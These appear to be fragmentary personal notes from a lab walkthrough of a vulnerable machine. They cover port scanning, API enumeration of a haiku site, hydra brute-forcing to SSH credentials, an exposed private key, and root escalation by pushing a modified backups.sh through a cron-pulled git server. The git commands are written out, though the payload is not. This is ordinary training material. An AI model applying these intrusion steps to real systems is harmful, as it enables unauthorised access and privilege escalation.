8080/tcp  open  http        Apache Tomcat (language: en)
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: My Haikus
12445/tcp open  netbios-ssn Samba smbd 4
18030/tcp open  http        Apache httpd 2.4.46 ((Unix))
| http-methods: 
|_  Supported Methods: HEAD OPTIONS
|_http-title: Whack A Mole!
|_http-server-header: Apache/2.4.46 (Unix)
43022/tcp open  ssh         OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   3072 7b:fc:37:b4:da:6e:c5:8e:a9:8b:b7:80:f5:cd:09:cb (RSA)
|   256 89:cd:ea:47:25:d9:8f:f8:94:c3:d6:5c:d4:05:ba:d0 (ECDSA)
|_  256 c0:7c:6f:47:7e:94:cc:8b:f8:3d:a0:a6:1f:a9:27:11 (ED25519)

port 8080. haiku website
<img width="953" height="626" alt="image" src="https://github.com/user-attachments/assets/4d51812c-413c-4dfd-b9f1-a5654c205706" />
in the posts. view source it shows /api/
<img width="511" height="71" alt="image" src="https://github.com/user-attachments/assets/5b87b94e-a6c5-49a9-b709-376a406cc560" />
<img width="750" height="436" alt="image" src="https://github.com/user-attachments/assets/5139127f-b8f3-46c5-be65-4674a57e2971" />
/api/user/
<img width="484" height="727" alt="image" src="https://github.com/user-attachments/assets/cf04d91b-1ca8-4805-bd20-20b4c4f029b9" />
use hydra. dademola:ExplainSlowQuest110 for ssh
<img width="1702" height="187" alt="image" src="https://github.com/user-attachments/assets/8db1b646-8408-45e6-96c8-4c5117a23210" />

linenum
[+] SSH private keys:
/home/git/.ssh/id_rsa
-rwxr-xr-x 1 root root 2.6K Nov  5  2020 /home/git/.ssh/id_rsa
READABLE! Can be exfiltrated
can login into git., but cant do anything inside
<img width="587" height="99" alt="image" src="https://github.com/user-attachments/assets/174a51c2-ee63-4f66-8222-d202137eb3ae" />

has crontab.bak
*/3 * * * * /root/git-server/backups.sh
*/2 * * * * /root/pull.sh
<img width="508" height="64" alt="image" src="https://github.com/user-attachments/assets/da1b30cb-581d-4472-8d76-44694459cfcf" />

clone the git server
GIT_SSH_COMMAND='ssh -i id_rsa -p 43022' git clone git@$ip:/git-server
changed backup.sh and chmod 777 backups.sh
<img width="512" height="58" alt="image" src="https://github.com/user-attachments/assets/0ad7e54a-f062-4687-a698-ea9e8fb594b7" />
GIT_SSH_COMMAND='ssh -i id_rsa -p 43022' git clone git@192.168.141.125:/git-server
git config --global user.name "kali"
git config --global user.email "kali@kali.(none)"
git add -A   
git commit -m "oof"
GIT_SSH_COMMAND='ssh -i ../id_rsa -p 43022' git push origin master
<img width="542" height="182" alt="image" src="https://github.com/user-attachments/assets/2998d7cd-904d-46b0-bc70-86f7332198d6" />
<img width="512" height="58" alt="image" src="https://github.com/user-attachments/assets/0ad180c6-06f5-4d79-9249-8648ef3b1684" />


port 12445 smb. a lot of kt files
<img width="828" height="645" alt="image" src="https://github.com/user-attachments/assets/51ed005b-4444-453e-8161-b9f71fcf2944" />
